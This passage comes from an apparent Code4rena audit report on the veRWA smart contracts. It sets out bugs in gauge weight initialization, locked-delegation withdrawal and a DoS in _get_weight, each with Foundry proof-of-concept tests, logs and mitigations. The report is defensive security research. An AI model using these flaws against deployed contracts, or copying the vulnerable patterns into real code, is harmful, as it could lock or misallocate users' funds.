weight after voting: &quot;</span><span class=\"mtk1\">, </span><span class=\"mtk12\">weight</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">vm</span><span class=\"mtk1\">.</span><span class=\"mtk11\">stopPrank</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">vm</span><span class=\"mtk1\">.</span><span class=\"mtk11\">prank</span><span class=\"mtk1\">(</span><span class=\"mtk12\">gov</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">gc</span><span class=\"mtk1\">.</span><span class=\"mtk11\">change_gauge_weight</span><span class=\"mtk1\">(</span><span class=\"mtk12\">gauge1</span><span class=\"mtk1\">, </span><span class=\"mtk7\">0</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">vm</span><span class=\"mtk1\">.</span><span class=\"mtk11\">startPrank</span><span class=\"mtk1\">(</span><span class=\"mtk12\">user1</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">gc</span><span class=\"mtk1\">.</span><span class=\"mtk11\">vote_for_gauge_weights</span><span class=\"mtk1\">(</span><span class=\"mtk12\">gauge1</span><span class=\"mtk1\">, </span><span class=\"mtk7\">10000</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">weight</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">gc</span><span class=\"mtk1\">.</span><span class=\"mtk11\">get_gauge_weight</span><span class=\"mtk1\">(</span><span class=\"mtk12\">gauge1</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk10\">console</span><span class=\"mtk1\">.</span><span class=\"mtk11\">log</span><span class=\"mtk1\">(</span><span class=\"mtk8\">&quot;gauge&#39;s weight after voting after admin set&quot;</span><span class=\"mtk1\">, </span><span class=\"mtk12\">weight</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">gc</span><span class=\"mtk1\">.</span><span class=\"mtk11\">vote_for_gauge_weights</span><span class=\"mtk1\">(</span><span class=\"mtk12\">gauge1</span><span class=\"mtk1\">, </span><span class=\"mtk7\">0</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">gc</span><span class=\"mtk1\">.</span><span class=\"mtk11\">vote_for_gauge_weights</span><span class=\"mtk1\">(</span><span class=\"mtk12\">gauge1</span><span class=\"mtk1\">, </span><span class=\"mtk7\">10000</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">weight</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">gc</span><span class=\"mtk1\">.</span><span class=\"mtk11\">get_gauge_weight</span><span class=\"mtk1\">(</span><span class=\"mtk12\">gauge1</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk10\">console</span><span class=\"mtk1\">.</span><span class=\"mtk11\">log</span><span class=\"mtk1\">(</span><span class=\"mtk8\">&quot;gauge&#39;s weight after voting after admin set after vote reset&quot;</span><span class=\"mtk1\">, </span><span class=\"mtk12\">weight</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    }</span></span></span></code></pre>\n<p>and the respective results:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"\" data-index=\"7\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\">[PASS] testWithoutManualSet() (gas: 645984)</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">Logs:</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  gauge&#39;s weight after voting:  0</span></span></code></pre>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"\" data-index=\"8\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\">    [PASS] testWithManualSet() (gas: 667994)</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    Logs:</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">      gauge&#39;s weight after voting:  993424657416307200</span></span></code></pre>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"\" data-index=\"9\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\">    [PASS] testWithChangeMidway() (gas: 744022)</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    Logs:</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">      gauge&#39;s weight after voting:  0</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">      gauge&#39;s weight after voting after admin set 0</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">      gauge&#39;s weight after voting after admin set after vote reset 993424657416307200</span></span></code></pre>\n</details>\n<h3 id=\"tools-used-2\" style=\"position:relative;\"><a href=\"#tools-used-2\" aria-label=\"tools used 2 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Tools Used</h3>\n<p>Foundry</p>\n<h3 id=\"recommended-mitigation-steps-2\" style=\"position:relative;\"><a href=\"#recommended-mitigation-steps-2\" aria-label=\"recommended mitigation steps 2 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommended Mitigation Steps</h3>\n<p>Upon adding a gauge, make a call to <code>change_gauge_weight</code> and set its initial weight to 0.</p>\n<p><strong><a href=\"https://github.com/code-423n4/2023-08-verwa-findings/issues/288#issuecomment-1678351795\">__141345__ (Lookout) commented</a>:</strong></p>\n<blockquote>\n<p>Forget to initialize <code>time_weight[]</code> when add new gauge.</p>\n</blockquote>\n<hr>\n<h2 id=\"h-04-delegated-votes-are-locked-when-owner-lock-is-expired\" style=\"position:relative;\"><a href=\"#h-04-delegated-votes-are-locked-when-owner-lock-is-expired\" aria-label=\"h 04 delegated votes are locked when owner lock is expired permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><a href=\"https://github.com/code-423n4/2023-08-verwa-findings/issues/268\">[H-04] Delegated votes are locked when owner lock is expired</a></h2>\n<p><em>Submitted by <a href=\"https://github.com/code-423n4/2023-08-verwa-findings/issues/268\">ltyu</a>, also found by <a href=\"https://github.com/code-423n4/2023-08-verwa-findings/issues/248\">qpzm</a>, <a href=\"https://github.com/code-423n4/2023-08-verwa-findings/issues/231\">RED-LOTUS-REACH</a>, <a href=\"https://github.com/code-423n4/2023-08-verwa-findings/issues/226\">bart1e</a>, <a href=\"https://github.com/code-423n4/2023-08-verwa-findings/issues/171\">0xDING99YA</a>, <a href=\"https://github.com/code-423n4/2023-08-verwa-findings/issues/158\">zhaojie</a>, <a href=\"https://github.com/code-423n4/2023-08-verwa-findings/issues/151\">popular00</a>, <a href=\"https://github.com/code-423n4/2023-08-verwa-findings/issues/118\">MrPotatoMagic</a>, <a href=\"https://github.com/code-423n4/2023-08-verwa-findings/issues/112\">carrotsmuggler</a>, <a href=\"https://github.com/code-423n4/2023-08-verwa-findings/issues/79\">pep7siup</a>, <a href=\"https://github.com/code-423n4/2023-08-verwa-findings/issues/30\">3docSec</a>, <a href=\"https://github.com/code-423n4/2023-08-verwa-findings/issues/403\">mert_eren</a>, <a href=\"https://github.com/code-423n4/2023-08-verwa-findings/issues/373\">kaden</a>, <a href=\"https://github.com/code-423n4/2023-08-verwa-findings/issues/352\">Yuki</a>, <a href=\"https://github.com/code-423n4/2023-08-verwa-findings/issues/275\">seerether</a>, <a href=\"https://github.com/code-423n4/2023-08-verwa-findings/issues/238\">KmanOfficial</a>, cducrest (<a href=\"https://github.com/code-423n4/2023-08-verwa-findings/issues/236\">1</a>, <a href=\"https://github.com/code-423n4/2023-08-verwa-findings/issues/227\">2</a>), <a href=\"https://github.com/code-423n4/2023-08-verwa-findings/issues/211\">Tendency</a>, and <a href=\"https://github.com/code-423n4/2023-08-verwa-findings/issues/170\">bin2chen</a></em></p>\n<p><a href=\"https://github.com/code-423n4/2023-08-verwa/blob/a693b4db05b9e202816346a6f9cada94f28a2698/src/VotingEscrow.sol#L331\">https://github.com/code-423n4/2023-08-verwa/blob/a693b4db05b9e202816346a6f9cada94f28a2698/src/VotingEscrow.sol#L331</a> </p>\n<p><a href=\"https://github.com/code-423n4/2023-08-verwa/blob/a693b4db05b9e202816346a6f9cada94f28a2698/src/VotingEscrow.sol#L371-L374\">https://github.com/code-423n4/2023-08-verwa/blob/a693b4db05b9e202816346a6f9cada94f28a2698/src/VotingEscrow.sol#L371-L374</a></p>\n<p><a href=\"https://github.com/code-423n4/2023-08-verwa/blob/a693b4db05b9e202816346a6f9cada94f28a2698/src/VotingEscrow.sol#L383\">https://github.com/code-423n4/2023-08-verwa/blob/a693b4db05b9e202816346a6f9cada94f28a2698/src/VotingEscrow.sol#L383</a></p>\n<p>In <code>delegate()</code> of VoteEscrow.sol, a user is able to delegate their locked votes to someone else, and undelegate (i.e. delegate back to themselves). When the user tries to re-delegate, either to someone else or themselves, the lock must not be expired. This is problematic because if a user forgets and lets their lock become expired, they cannot undelegate. This blocks withdrawal, which means their tokens are essentially locked forever.</p>\n<h3 id=\"proof-of-concept-3\" style=\"position:relative;\"><a href=\"#proof-of-concept-3\" aria-label=\"proof of concept 3 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Proof of Concept</h3>\n<p>To exit the system, Alice must call <code>withdraw()</code>. However, since they’ve delegated, they will not be able to.</p>\n<details>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"10\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">withdraw</span><span class=\"mtk1\">() </span><span class=\"mtk11\">external</span><span class=\"mtk1\"> </span><span class=\"mtk11\">nonReentrant</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t...</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t</span><span class=\"mtk11\">require</span><span class=\"mtk1\">(</span><span class=\"mtk12\">locked_</span><span class=\"mtk1\">.</span><span class=\"mtk12\">delegatee</span><span class=\"mtk1\"> == </span><span class=\"mtk12\">msg</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sender</span><span class=\"mtk1\">, </span><span class=\"mtk8\">&quot;Lock delegated&quot;</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t...</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">}</span></span></span></code></pre>\n<p>To re-delegate to themselves (undelegate), they call <code>delegate(alice.address)</code>. However, there is a check to see if <code>toLocked.end</code> has expired, which would be true since it would point to Alice’s lock.</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"\" data-index=\"11\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\">function delegate(address _addr) external nonReentrant {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">\tLockedBalance memory locked_ = locked[msg.sender];</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">\t...</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">\tLockedBalance memory fromLocked;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">\tLockedBalance memory toLocked;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">\tlocked_.delegatee = _addr;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">\tif (delegatee == msg.sender) {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">\t\t...</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">\t// @audit this else if will execute</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">\t} else if (_addr == msg.sender) {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">\t\t// Undelegate</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">\t\tfromLocked = locked[delegatee]; // @audit Delegatee</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">\t\ttoLocked = locked_; // @audit Alice&#39;s lock</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">\t}</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">\t...</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">\trequire(toLocked.end &gt; block.timestamp, &quot;Delegatee lock expired&quot;);</span></span></code></pre>\n<p>This is a test to be added into VoteEscrow.t.sol. It can be manually run by executing <code>forge test --match-test testUnSuccessUnDelegate</code>.</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"12\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">testUnSuccessUnDelegate</span><span class=\"mtk1\">() </span><span class=\"mtk11\">public</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t</span><span class=\"mtk11\">testSuccessDelegate</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t</span><span class=\"mtk12\">vm</span><span class=\"mtk1\">.</span><span class=\"mtk11\">warp</span><span class=\"mtk1\">(</span><span class=\"mtk12\">ve</span><span class=\"mtk1\">.</span><span class=\"mtk11\">LOCKTIME</span><span class=\"mtk1\">() + </span><span class=\"mtk7\">1</span><span class=\"mtk1\"> </span><span class=\"mtk12\">days</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t</span><span class=\"mtk3\">// Try to undelegate</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t</span><span class=\"mtk12\">vm</span><span class=\"mtk1\">.</span><span class=\"mtk11\">startPrank</span><span class=\"mtk1\">(</span><span class=\"mtk12\">user1</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t</span><span class=\"mtk12\">vm</span><span class=\"mtk1\">.</span><span class=\"mtk11\">expectRevert</span><span class=\"mtk1\">(</span><span class=\"mtk8\">&quot;Delegatee lock expired&quot;</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t</span><span class=\"mtk12\">ve</span><span class=\"mtk1\">.</span><span class=\"mtk11\">delegate</span><span class=\"mtk1\">(</span><span class=\"mtk12\">user1</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t</span><span class=\"mtk3\">// Still user2</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t(, , , </span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">delegatee</span><span class=\"mtk1\">) = </span><span class=\"mtk12\">ve</span><span class=\"mtk1\">.</span><span class=\"mtk11\">locked</span><span class=\"mtk1\">(</span><span class=\"mtk12\">user1</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t</span><span class=\"mtk11\">assertEq</span><span class=\"mtk1\">(</span><span class=\"mtk12\">delegatee</span><span class=\"mtk1\">, </span><span class=\"mtk12\">user2</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">}</span></span></span></code></pre>\n</details>\n<h3 id=\"recommended-mitigation-steps-3\" style=\"position:relative;\"><a href=\"#recommended-mitigation-steps-3\" aria-label=\"recommended mitigation steps 3 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommended Mitigation Steps</h3>\n<p>Consider refactoring the code to skip <code>toLocked.end > block.timestamp</code> if undelegating. For example, adding a small delay (e.g., 1 second) to the lock end time when a user undelegates.</p>\n<p><strong><a href=\"https://github.com/code-423n4/2023-08-verwa-findings/issues/268#issuecomment-1694504863\">alcueca (Judge) commented</a>:</strong></p>\n<blockquote>\n<p>This vulnerability, if not found, would have meant that some users would have permanently lost assets in the form of voting power. While at that point the application owners would certainly warn users to not let their locks expire without undelegating, many users would not get the warning, as it is not that easy to make sure that every user is aware of something. The result is that time and again, users would get their tokens locked forever.</p>\n</blockquote>\n<p><strong><a href=\"https://github.com/code-423n4/2023-08-verwa-findings/issues/112\">OpenCoreCH (veRWA) confirmed on duplicate 112</a></strong></p>\n<hr>\n<h2 id=\"h-05-it-is-possible-to-dos-all-the-functions-related-to-some-gauge-in-gaugecontroller\" style=\"position:relative;\"><a href=\"#h-05-it-is-possible-to-dos-all-the-functions-related-to-some-gauge-in-gaugecontroller\" aria-label=\"h 05 it is possible to dos all the functions related to some gauge in gaugecontroller permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><a href=\"https://github.com/code-423n4/2023-08-verwa-findings/issues/206\">[H-05] It is possible to DoS all the functions related to some gauge in <code>GaugeController</code></a></h2>\n<p><em>Submitted by <a href=\"https://github.com/code-423n4/2023-08-verwa-findings/issues/206\">bart1e</a>, also found by <a href=\"https://github.com/code-423n4/2023-08-verwa-findings/issues/386\">0xDetermination</a></em></p>\n<p><a href=\"https://github.com/code-423n4/2023-08-verwa/blob/a693b4db05b9e202816346a6f9cada94f28a2698/src/GaugeController.sol#L91-L114\">https://github.com/code-423n4/2023-08-verwa/blob/a693b4db05b9e202816346a6f9cada94f28a2698/src/GaugeController.sol#L91-L114</a> </p>\n<p><a href=\"https://github.com/code-423n4/2023-08-verwa/blob/a693b4db05b9e202816346a6f9cada94f28a2698/src/GaugeController.sol#L142\">https://github.com/code-423n4/2023-08-verwa/blob/a693b4db05b9e202816346a6f9cada94f28a2698/src/GaugeController.sol#L142</a> </p>\n<p><a href=\"https://github.com/code-423n4/2023-08-verwa/blob/a693b4db05b9e202816346a6f9cada94f28a2698/src/GaugeController.sol#L180\">https://github.com/code-423n4/2023-08-verwa/blob/a693b4db05b9e202816346a6f9cada94f28a2698/src/GaugeController.sol#L180</a> </p>\n<p><a href=\"https://github.com/code-423n4/2023-08-verwa/blob/a693b4db05b9e202816346a6f9cada94f28a2698/src/GaugeController.sol#L189\">https://github.com/code-423n4/2023-08-verwa/blob/a693b4db05b9e202816346a6f9cada94f28a2698/src/GaugeController.sol#L189</a> </p>\n<p><a href=\"https://github.com/code-423n4/2023-08-verwa/blob/a693b4db05b9e202816346a6f9cada94f28a2698/src/GaugeController.sol#L247\">https://github.com/code-423n4/2023-08-verwa/blob/a693b4db05b9e202816346a6f9cada94f28a2698/src/GaugeController.sol#L247</a></p>\n<p><code>_get_weight</code> function is used in order to return the total gauge’s weight and it also updates past values of the <code>points_weight</code> mapping, if <code>time_weight[_gauge_addr]</code> is less or equal to the <code>block.timestamp</code>. It contains the following loop:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"13\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk15\">for</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">i</span><span class=\"mtk1\">; </span><span class=\"mtk12\">i</span><span class=\"mtk1\"> &lt; </span><span class=\"mtk7\">500</span><span class=\"mtk1\">; ++</span><span class=\"mtk12\">i</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">                </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">t</span><span class=\"mtk1\"> &gt; </span><span class=\"mtk12\">block</span><span class=\"mtk1\">.</span><span class=\"mtk12\">timestamp</span><span class=\"mtk1\">) </span><span class=\"mtk15\">break</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">                </span><span class=\"mtk12\">t</span><span class=\"mtk1\"> += </span><span class=\"mtk12\">WEEK</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">                </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">d_bias</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">pt</span><span class=\"mtk1\">.</span><span class=\"mtk12\">slope</span><span class=\"mtk1\"> * </span><span class=\"mtk12\">WEEK</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">                </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">pt</span><span class=\"mtk1\">.</span><span class=\"mtk12\">bias</span><span class=\"mtk1\"> &gt; </span><span class=\"mtk12\">d_bias</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">                    </span><span class=\"mtk12\">pt</span><span class=\"mtk1\">.</span><span class=\"mtk12\">bias</span><span class=\"mtk1\"> -= </span><span class=\"mtk12\">d_bias</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">                    </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">d_slope</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">changes_weight</span><span class=\"mtk1\">[</span><span class=\"mtk12\">_gauge_addr</span><span class=\"mtk1\">][</span><span class=\"mtk12\">t</span><span class=\"mtk1\">];</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">                    </span><span class=\"mtk12\">pt</span><span class=\"mtk1\">.</span><span class=\"mtk12\">slope</span><span class=\"mtk1\"> -= </span><span class=\"mtk12\">d_slope</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">                } </span><span class=\"mtk15\">else</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">                    </span><span class=\"mtk12\">pt</span><span class=\"mtk1\">.</span><span class=\"mtk12\">bias</span><span class=\"mtk1\"> = </span><span class=\"mtk7\">0</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">                    </span><span class=\"mtk12\">pt</span><span class=\"mtk1\">.</span><span class=\"mtk12\">slope</span><span class=\"mtk1\"> = </span><span class=\"mtk7\">0</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">                }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">                </span><span class=\"mtk12\">points_weight</span><span class=\"mtk1\">[</span><span class=\"mtk12\">_gauge_addr</span><span class=\"mtk1\">][</span><span class=\"mtk12\">t</span><span class=\"mtk1\">] = </span><span class=\"mtk12\">pt</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">                </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">t</span><span class=\"mtk1\"> &gt; </span><span class=\"mtk12\">block</span><span class=\"mtk1\">.</span><span class=\"mtk12\">timestamp</span><span class=\"mtk1\">) </span><span class=\"mtk12\">time_weight</span><span class=\"mtk1\">[</span><span class=\"mtk12\">_gauge_addr</span><span class=\"mtk1\">] = </span><span class=\"mtk12\">t</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            }</span></span></span></code></pre>\n<p>There are two possible scenarios:</p>\n<ul>\n<li><code>pt.bias > d_bias</code></li>\n<li><code>pt.bias &#x3C;= d_bias</code></li>\n</ul>\n<p>The first scenario will always happen naturally, since <code>pt.bias</code> will be the total voting power allocated for some point and since slope is a sum of all users’ slopes and slopes are calculated in such a way that 